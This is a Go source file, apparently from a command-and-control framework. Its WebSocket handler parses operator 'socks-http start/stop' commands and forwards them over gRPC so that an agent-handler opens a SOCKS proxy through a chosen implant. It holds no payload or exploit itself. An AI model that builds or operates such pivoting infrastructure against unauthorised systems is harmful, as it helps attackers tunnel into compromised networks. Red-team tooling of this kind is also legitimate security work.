// internal/websocket/handlers/socks_http.go
// WebSocket handler for HTTP-based SOCKS proxy commands (socks-http)
// This handler just forwards commands to gRPC - the agent-handler service
// starts the actual SOCKS listener.
package handlers

import (
	"c2/internal/websocket/hub"
	"encoding/json"
	"fmt"
	"log"
	"strings"
)

func (h *WSHandler) handleSocksHTTPCommand(client *hub.Client, message []byte) error {
	var msg struct {
		Type string `json:"type"`
		Data struct {
			Command string `json:"command"`
			AgentID string `json:"agent_id"`
			Port    int    `json:"port"`
		} `json:"data"`
	}

	if err := json.Unmarshal(message, &msg); err != nil {
		return fmt.Errorf("failed to unmarshal socks-http message: %v", err)
	}

	parts := strings.Fields(msg.Data.Command)
	if len(parts) < 2 {
		return h.sendSocksHTTPError(client, "invalid socks-http command format")
	}

	action := parts[1] // start or stop

	// Get port from command args or message data
	port := msg.Data.Port
	if port == 0 && len(parts) >= 3 {
		fmt.Sscanf(parts[2], "%d", &port)
	}
	if port == 0 {
		port = 1080 // default
	}

	// Build command to forward to gRPC (which runs in agent-handler service)
	// The agent-handler will start the SOCKS listener there
	command := map[string]interface{}{
		"command":  msg.Data.Command, // e.g., "socks-http start 9999" or "socks-http stop"
		"agent_id": msg.Data.AgentID,
		"port":     port,
	}

	// Queue via gRPC stream - agent-handler will process this
	if err := h.agentClient.SendToStream("agent_command", command); err != nil {
		log.Printf("[SOCKS-HTTP] Failed to send command: %v", err)
		return h.sendSocksHTTPError(client, fmt.Sprintf("failed to send command: %v", err))
	}

	log.Printf("[SOCKS-HTTP] Forwarded %s command to agent-handler for agent %s", action, msg.Data.AgentID)

	// Send acknowledgment - the actual result will come from gRPC broadcast
	response := Response{
		Type:    "command_queued",
		Status:  "success",
		Message: fmt.Sprintf("SOCKS-HTTP %s command queued", action),
	}

	responseJSON, _ := json.Marshal(response)
	client.Send <- responseJSON

	return nil
}

func (h *WSHandler) sendSocksHTTPError(client *hub.Client, message string) error {
	response := Response{
		Type:    "socks_http_error",
		Status:  "error",
		Message: message,
	}

	responseJSON, _ := json.Marshal(response)
	client.Send <- responseJSON

	log.Printf("[SOCKS-HTTP] Error: %s", message)
	return fmt.Errorf(message)
}
